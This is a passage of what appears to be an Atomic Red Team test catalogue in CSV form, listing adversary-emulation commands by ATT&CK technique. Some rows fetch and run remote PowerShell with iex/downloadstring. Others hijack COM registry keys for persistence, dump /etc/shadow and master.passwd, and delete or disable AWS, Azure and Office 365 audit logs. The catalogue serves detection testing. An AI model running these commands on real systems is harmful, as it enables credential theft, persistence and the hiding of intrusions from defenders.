Upon execution, version information about internet explorer will be displayed.
",windows,,,"reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" /v svcVersion
",command_prompt,,,,,,
T1518,Software Discovery,Applications Installed,c49978f6-bd6e-4221-ad2c-9e3e30cc1e3b,"Query the registry to determine software and versions installed on the system. Upon execution a table of
software name and version information will be displayed.
",windows,,,"Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
",powershell,,,,,,
T1518,Software Discovery,Find and Display Safari Browser Version,103d6533-fd2a-4d08-976a-4a598565280f,"Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors
",macos,,,"/usr/libexec/PlistBuddy -c ""print :CFBundleShortVersionString"" /Applications/Safari.app/Contents/Info.plist
/usr/libexec/PlistBuddy -c ""print :CFBundleVersion"" /Applications/Safari.app/Contents/Info.plist
",sh,False,,,,,
T1518,Software Discovery,WinPwn - Dotnetsearch,7e79a1b6-519e-433c-ad55-3ff293667101,Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Dotnetsearch -noninteractive -consoleoutput",powershell,,,,,,
T1518,Software Discovery,WinPwn - DotNet,10ba02d0-ab76-4f80-940d-451633f24c5b,Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
dotnet -consoleoutput -noninteractive",powershell,,,,,,
T1518,Software Discovery,WinPwn - powerSQL,0bb64470-582a-4155-bde2-d6003a95ed34,Start PowerUpSQL Checks using powerSQL function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput",powershell,,,,,,
T1546.015,Event Triggered Execution: Component Object Model Hijacking,COM Hijacking - InprocServer32,48117158-d7be-441b-bc6a-d9e36e47b52b,"This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.

Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/",windows,,,"New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value ""#{dllpath}""
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType ""String""
Start-Process -FilePath ""C:\Windows\System32\RUNDLL32.EXE"" -ArgumentList '-sta #{clsid}'",powershell,,,Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse -ErrorAction Ignore,powershell,"dependencies.0.description: DLL For testing
dependencies.0.prereq_command: if (Test-Path ""#{dllpath}"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll"" -OutFile ""#{dllpath}""

","input_arguments.clsid_threading.description: Threading Model

input_arguments.clsid_threading.type: string

input_arguments.clsid_threading.default: Apartment

input_arguments.dllpath.description: Path to the DLL.

input_arguments.dllpath.type: string

input_arguments.dllpath.default: PathToAtomicsFolder\..\ExternalPayloads\AtomicTest.dll

input_arguments.clsid.description: Class ID to hijack.

input_arguments.clsid.type: string

input_arguments.clsid.default: {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}

input_arguments.clsid_description.description: Description for CLSID

input_arguments.clsid_description.type: string

input_arguments.clsid_description.default: MSAA AccPropServices

"
T1546.015,Event Triggered Execution: Component Object Model Hijacking,Powershell Execute COM Object,752191b1-7c71-445c-9dbe-21bb031b18eb,"Use the PowerShell to execute COM CLSID object.
Reference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/",windows,,,"$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(""9BA05972-F6A8-11CF-A442-00A0C90A8F39""))
$item = $o.Item()
$item.Document.Application.ShellExecute(""cmd.exe"",""/c calc.exe"",""C:\windows\system32"",$null,0)
",powershell,,,"Get-Process -Name ""*calc"" | Stop-Process
",,,
T1546.015,Event Triggered Execution: Component Object Model Hijacking,COM Hijacking with RunDLL32 (Local Server Switch),123520cc-e998-471b-a920-bd28e3feafa0,"This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via ""rundll32.exe -localserver [clsid]"". 
This method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. 
Reference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/
Upon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ",windows,,,"New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value ""#{dll_path}""
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType ""String""
Start-Process -FilePath ""C:\Windows\System32\RUNDLL32.EXE"" -ArgumentList '-localserver #{clsid}'",powershell,,,Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse -ErrorAction Ignore,powershell,"dependencies.0.description: DLL For testing
dependencies.0.prereq_command: if (Test-Path ""#{dll_path}"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll"" -OutFile ""#{dll_path}""

","input_arguments.clsid_threading.description: Threading Model

input_arguments.clsid_threading.type: string

input_arguments.clsid_threading.default: Both

input_arguments.dll_path.description: Path to the DLL.

input_arguments.dll_path.type: string

input_arguments.dll_path.default: PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll

input_arguments.clsid.description: Class ID to hijack.

input_arguments.clsid.type: string

input_arguments.clsid.default: {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}

input_arguments.clsid_description.description: Description for CLSID

input_arguments.clsid_description.type: string

input_arguments.clsid_description.default: MSAA AccPropServices

"
T1546.015,Event Triggered Execution: Component Object Model Hijacking,COM hijacking via TreatAs,33eacead-f117-4863-8eb0-5c6304fbfaa9,"This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.
Then, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The
test is validated by running 'rundll32.exe -sta ""AtomicTest""' to avoid logging out.

References:

https://youtu.be/3gz1QmiMhss?t=1251

https://github.com/enigma0x3/windows-operating-system-archaeology",windows,,,"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /ve /T REG_SZ /d ""C:\WINDOWS\system32\scrobj.dll"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32"" /v ""ThreadingModel"" /T REG_SZ /d ""Apartment"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL"" /ve /T REG_SZ /d ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f

reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"" /f
reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f

rundll32.exe -sta ""AtomicTest"" ",powershell,,,"reg delete ""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest"" /f
reg delete ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"" /f
reg delete ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}"" /f",,,
T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",Access /etc/shadow (Local),3723ab77-c546-403c-8fb4-bb577033b235,"/etc/shadow file is accessed in Linux environments
",linux,,,"sudo cat /etc/shadow > #{output_file}
cat #{output_file}
",bash,True,,"rm -f #{output_file}
",,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1003.008.txt

"
T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",Access /etc/master.passwd (Local),5076874f-a8e6-4077-8ace-9e5ab54114a5,"/etc/master.passwd file is accessed in FreeBSD environments
",linux,,,"sudo cat /etc/master.passwd > #{output_file}
cat #{output_file}
",sh,True,,"rm -f #{output_file}
",,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1003.008.txt

"
T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",Access /etc/passwd (Local),60e860b6-8ae6-49db-ad07-5e73edd88f5d,"/etc/passwd file is accessed in FreeBSD and Linux environments
",linux,,,"cat /etc/passwd > #{output_file}
cat #{output_file}
",sh,,,"rm -f #{output_file}
",,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1003.008.txt

"
T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow","Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat",df1a55ae-019d-4120-bc35-94f4bc5c4b0a,"Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed
",linux,,,"unamestr=$(uname)
if [ ""$unamestr"" = 'Linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > ${output_file}; elif [ ""$unamestr"" = 'FreeBSD' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > ${output_file}; fi
",sh,True,,"rm -f #{output_file}
",,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1003.008.txt

"
T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow","Access /etc/{shadow,passwd,master.passwd} with shell builtins",f5aa6543-6cb2-4fae-b9c2-b96e14721713,"Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins
",linux,,,"testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }
[ ""$(uname)"" = 'FreeBSD' ] && testcat /etc/master.passwd
testcat /etc/passwd
testcat /etc/shadow
",sh,True,,"rm -f #{output_file}
",,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1003.008.txt

"
T1562.008,Impair Defenses: Disable Cloud Logs,AWS - CloudTrail Changes,9c10dc6b-20bd-403a-8e67-50ef7d07ed4e,"Creates a new cloudTrail in AWS, Upon successful creation it will Update,Stop and Delete the cloudTrail
",iaas:aws,,,"aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}
aws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}
aws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}
",sh,False,,"cd ""$PathToAtomicsFolder/T1562.008/src/T1562.008-1/""
terraform destroy -auto-approve
",,"dependencies.0.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.0.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.0.get_prereq_command: echo Please install the aws-cli and configure your AWS default profile using: aws configure

dependencies.1.description: Check if terraform is installed.

dependencies.1.prereq_command: terraform version

dependencies.1.get_prereq_command: echo Please install the terraform and configure your aws default profile 

dependencies.2.description: Check if the dependency resources are already present.

dependencies.2.prereq_command: if [ -f ""$PathToAtomicsFolder/T1562.008/src/T1562.008-1/terraform.tfstate"" ]; then exit 0; else exit 1; fi;

dependencies.2.get_prereq_command: cd ""$PathToAtomicsFolder/T1562.008/src/T1562.008-1/""
terraform init
terraform apply -auto-approve

","input_arguments.cloudtrail_name.description: Name of the cloudTrail

input_arguments.cloudtrail_name.type: string

input_arguments.cloudtrail_name.default: redatomictesttrail

input_arguments.s3_bucket_name.description: Name of the bucket

input_arguments.s3_bucket_name.type: string

input_arguments.s3_bucket_name.default: redatomic-test

input_arguments.region.description: Name of the region

input_arguments.region.type: string

input_arguments.region.default: us-east-1

"
T1562.008,Impair Defenses: Disable Cloud Logs,Azure - Eventhub Deletion,5e09bed0-7d33-453b-9bf3-caea32bff719,"Identifies an Event Hub deletion in Azure.
An Event Hub is an event processing service that ingests and processes large volumes of events and data.
An adversary may delete an Event Hub in an attempt to evade detection.
https://docs.microsoft.com/en-us/azure/event-hubs/event-hubs-about.
",iaas:azure,,,"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-AzureAD -Credential $creds
Remove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}
",powershell,False,,"cd ""$PathToAtomicsFolder/T1562.008/src/T1562.008-2/""
terraform destroy -auto-approve
",powershell,"dependencies.0.description: Install-Module -Name Az

dependencies.0.prereq_command: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.0.get_prereq_command: Install-Module -Name AzureAD -Force

dependencies.1.description: Check if terraform is installed.

dependencies.1.prereq_command: terraform version

dependencies.1.get_prereq_command: echo Please install the terraform.

dependencies.2.description: Check if the user is logged into Azure.

dependencies.2.prereq_command: az account show

dependencies.2.get_prereq_command: echo Configure your Azure account using: az login. 

dependencies.3.description: Create dependency resources using terraform

dependencies.3.prereq_command: try {if (Test-Path ""$PathToAtomicsFolder/T1562.008/src/T1562.008-2/terraform.tfstate"" ){ exit 0 } else {exit 1}} catch {exit 1}

dependencies.3.get_prereq_command: cd ""$PathToAtomicsFolder/T1562.008/src/T1562.008-2/""
terraform init
terraform apply -auto-approve

","input_arguments.username.description: Azure username

input_arguments.username.type: string

input_arguments.username.default: None

input_arguments.password.description: Azure password

input_arguments.password.type: string

input_arguments.password.default: None

input_arguments.event_hub_name.description: Name of the eventhub

input_arguments.event_hub_name.type: string

input_arguments.event_hub_name.default: test_eventhub

input_arguments.resource_group.description: Name of the resource group

input_arguments.resource_group.type: string

input_arguments.resource_group.default: None

input_arguments.name_space_name.description: Name of the NameSpace

input_arguments.name_space_name.type: string

input_arguments.name_space_name.default: None

"
T1562.008,Impair Defenses: Disable Cloud Logs,Office 365 - Exchange Audit Log Disabled,1ee572f3-056c-4632-a7fc-7e7c42b1543c,"You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.
Unified or Admin Audit logs are disabled via the Exchange Powershell cmdline.
https://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml
",office-365,,,"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False
",powershell,False,,"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $True
",powershell,"dependencies.0.description: ExchangeOnlineManagement PowerShell module must be installed

dependencies.0.prereq_command: $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}

dependencies.0.get_prereq_command: Install-Module -Name ExchangeOnlineManagement         
Import-Module ExchangeOnlineManagement

","input_arguments.username.description: office-365 username

input_arguments.username.type: string

input_arguments.username.default: None

input_arguments.password.description: office-365 password

input_arguments.password.type: string

input_arguments.password.default: None

"
T1562.008,Impair Defenses: Disable Cloud Logs,AWS - Disable CloudTrail Logging Through Event Selectors using Stratus,a27418de-bdce-4ebd-b655-38f11142bf0c,"Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/
",linux,macos,iaas:aws,"export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.defense-evasion.cloudtrail-event-selectors
echo ""starting detonate""
./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force
",sh,False,,"export AWS_REGION=#{aws_region}
echo ""Cleanup detonation""
cd #{stratus_path}
./stratus cleanup --all
rm -rf stratus*
",sh,"dependencies.0.description: Stratus binary must be present at the (#{stratus_path}/stratus)

dependencies.0.prereq_command: if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: if [ ""$(uname)"" == ""Darwin"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '""' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
elif [ ""$(expr substr $(uname) 1 5)"" == ""Linux"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '""' -f 4) 
  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
fi

dependencies.1.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.1.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.1.get_prereq_command: echo Please install the aws-cli and configure your AWS defult profile using: aws configure

","input_arguments.stratus_path.description: Path of stratus binary

input_arguments.stratus_path.type: path

input_arguments.stratus_path.default: $PathToAtomicsFolder/T1562.008/src

input_arguments.aws_region.description: AWS region to detonate

input_arguments.aws_region.type: string

input_arguments.aws_region.default: us-west-2

"
T1562.008,Impair Defenses: Disable Cloud Logs,AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus,22d89a2f-d475-4895-b2d4-68626d49c029,"This Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/
",linux,macos,,"export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule
echo ""starting detonate""
./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force
",sh,False,,"export AWS_REGION=#{aws_region}
echo ""Cleanup detonation""
cd #{stratus_path}
./stratus cleanup --all
rm -rf stratus*
",sh,"dependencies.0.description: Stratus binary must be present at the (#{stratus_path}/stratus)

dependencies.0.prereq_command: if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: if [ ""$(uname)"" == ""Darwin"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '""' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
elif [ ""$(expr substr $(uname) 1 5)"" == ""Linux"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '""' -f 4) 
  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
fi

dependencies.1.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.1.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.1.get_prereq_command: echo Please install the aws-cli and configure your AWS defult profile using: aws configure

","input_arguments.stratus_path.description: Path of stratus binary

input_arguments.stratus_path.type: path

input_arguments.stratus_path.default: $PathToAtomicsFolder/T1562.008/src

input_arguments.aws_region.description: AWS region to detonate

input_arguments.aws_region.type: string

input_arguments.aws_region.default: us-west-2

"
T1562.008,Impair Defenses: Disable Cloud Logs,AWS - Remove VPC Flow Logs using Stratus,93c150f5-ad7b-4ee3-8992-df06dec2ac79,"This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/
",linux,macos,iaas:aws,"export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.defense-evasion.vpc-remove-flow-logs
echo ""starting detonate""
./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force
",sh,False,,"export AWS_REGION=#{aws_region}
echo ""Cleanup detonation""
cd #{stratus_path}
./stratus cleanup --all
rm -rf stratus*
",sh,"dependencies.0.description: Stratus binary must be present at the (#{stratus_path}/stratus)

dependencies.0.prereq_command: if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: if [ ""$(uname)"" == ""Darwin"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '""' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
elif [ ""$(expr substr $(uname) 1 5)"" == ""Linux"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '""' -f 4) 
  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
fi

dependencies.1.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.1.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.1.get_prereq_command: echo Please install the aws-cli and configure your AWS defult profile using: aws configure

","input_arguments.stratus_path.description: Path of stratus binary

input_arguments.stratus_path.type: path

input_arguments.stratus_path.default: $PathToAtomicsFolder/T1562.008/src

input_arguments.aws_region.description: AWS region to detonate

input_arguments.aws_region.type: string

input_arguments.aws_region.default: us-west-2

"
T1562.008,Impair Defenses: Disable Cloud Logs,AWS - CloudWatch Log Group Deletes,89422c87-b57b-4a04-a8ca-802bb9d06121,"Creates a new cloudWatch log group in AWS, Upon successful creation it will Delete the group. Attackers can use this technique to evade defenses by 
deleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-group-deletion.html#aws-cloudwatch-log-group-deletion
",iaas:aws,,,"aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Created ***""
aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Deleted ***""
",sh,False,,,,"dependencies.0.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.0.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.0.get_prereq_command: echo Please install the aws-cli and configure your AWS defult profile using: aws configure

","input_arguments.cloudwatch_log_group_name.description: Name of the cloudWatch log group

input_arguments.cloudwatch_log_group_name.type: string

input_arguments.cloudwatch_log_group_name.default: log-test

input_arguments.region.description: Name of the region

input_arguments.region.type: string

input_arguments.region.default: us-east-1

"
T1562.008,Impair Defenses: Disable Cloud Logs,AWS CloudWatch Log Stream Deletes,33ca84bc-4259-4943-bd36-4655dc420932,"Creates a new cloudWatch log stream in AWS, Upon successful creation it will Delete the stream. Attackers can use this technique to evade defenses by 
deleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-stream-deletion.html
",iaas:aws,,,"aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Created ***""
aws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}
echo ""*** Log Stream Created ***""
aws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}
echo ""*** Log Stream Deleted ***""
aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json
echo ""*** Log Group Deleted ***""
",sh,False,,,,"dependencies.0.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.0.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.0.get_prereq_command: echo Please install the aws-cli and configure your AWS defult profile using: aws configure

","input_arguments.cloudwatch_log_group_name.description: Name of the cloudWatch log group

input_arguments.cloudwatch_log_group_name.type: string

input_arguments.cloudwatch_log_group_name.default: test-logs

input_arguments.cloudwatch_log_stream_name.description: Name of the cloudWatch log stream

input_arguments.cloudwatch_log_stream_name.type: string

input_arguments.cloudwatch_log_stream_name.default: 20150601

input_arguments.region.description: Name of the region

input_arguments.region.type: string

input_arguments.region.default: us-west-2

"
T1562.008,Impair Defenses: Disable Cloud Logs,Office 365 - Set Audit Bypass For a Mailbox,c9a2f6fe-7197-488c-af6d-10c782121ca6,"Use Exchange Management Shell to Mailbox auditing to bypass. It will prevent any mailbox audit logging entries being generated for the target e-mail box.
https://learn.microsoft.com/en-us/powershell/module/exchange/set-mailboxauditbypassassociation?view=exchange-ps
",office-365,,,"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-ExchangeOnline -Credential $creds
Set-MailboxAuditBypassAssociation -Identity ""#{target_email}"" -AuditBypassEnabled $true
